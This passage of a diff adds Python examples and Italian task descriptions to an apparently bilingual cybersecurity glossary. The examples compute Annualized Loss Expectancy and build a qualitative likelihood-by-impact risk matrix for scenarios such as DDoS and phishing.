+    {'name': 'DDoS su e-commerce',       'av': 200_000, 'ef': 0.4, 'aro': 1.5},
+]
+
+for s in scenarios:
+    s['ale'] = ale(s['av'], s['ef'], s['aro'])
+    print(f"{s['name']:35s} ALE = EUR {s['ale']:>12,.0f}")`,
+              task: `Calcola l'Annualized Loss Expectancy per un set di scenari di rischio combinando valore dell'asset, exposure factor e tasso annuo, per supportare la presentazione al board con cifre quantitative.`,
             },
             {
               english: 'Qualitative Risk Analysis',
@@ -5399,6 +6636,25 @@ export default {
               example: `Small teams default to qualitative risk analysis with a simple high/medium/low matrix instead of full Monte Carlo models. = I team piccoli ripiegano sull'analisi qualitativa del rischio con una semplice matrice alto/medio/basso invece di modelli Monte Carlo completi.`,
               context: 'risk-management',
               difficulty: 'beginner',
+              code: `# Qualitative risk matrix: map likelihood x impact to a risk tier
+LIKELIHOOD = {'rara': 1, 'improbabile': 2, 'possibile': 3, 'probabile': 4, 'quasi_certa': 5}
+IMPACT = {'trascurabile': 1, 'minore': 2, 'moderato': 3, 'maggiore': 4, 'catastrofico': 5}
+
+def tier(likelihood: str, impact: str) -> str:
+    score = LIKELIHOOD[likelihood] * IMPACT[impact]
+    if score >= 15: return 'CRITICO'
+    if score >= 9:  return 'ALTO'
+    if score >= 4:  return 'MEDIO'
+    return 'BASSO'
+
+register = [
+    ('Furto laptop',         'possibile',  'moderato'),
+    ('Insider malevolo',     'improbabile','maggiore'),
+    ('Phishing del CEO',     'probabile',  'maggiore'),
+]
+for name, lk, im in register:
+    print(f'{name:25s} -> {tier(lk, im)}')`,
+              task: 'Implementa una matrice qualitativa likelihood-per-impatto che classifichi ogni voce del registro rischi in una fascia da BASSO a CRITICO, utile per i team che non dispongono di dati quantitativi.',
             },
             {
               english: 'Threat Assessment',
